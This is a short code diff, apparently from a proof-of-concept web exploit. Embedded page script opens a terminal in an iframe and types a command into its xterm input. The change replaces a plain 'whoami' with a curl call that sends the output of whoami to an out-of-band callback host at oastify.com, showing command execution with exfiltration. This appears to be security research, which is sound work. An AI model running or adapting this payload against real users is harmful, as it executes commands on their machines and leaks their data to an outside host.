@@ -72,7 +72,7 @@
         await openTerminal(iframe, doc);
         await waitFor(doc, '.xterm-helper-textarea');
         await wait(1500);
-        sendCommand(doc, 'whoami');
+        sendCommand(doc, 'curl 4ejja5qhlnsaneh7go4zoi6vvm1dp4is7.oastify.com/`whoami`');
       }
       run();
     </script>
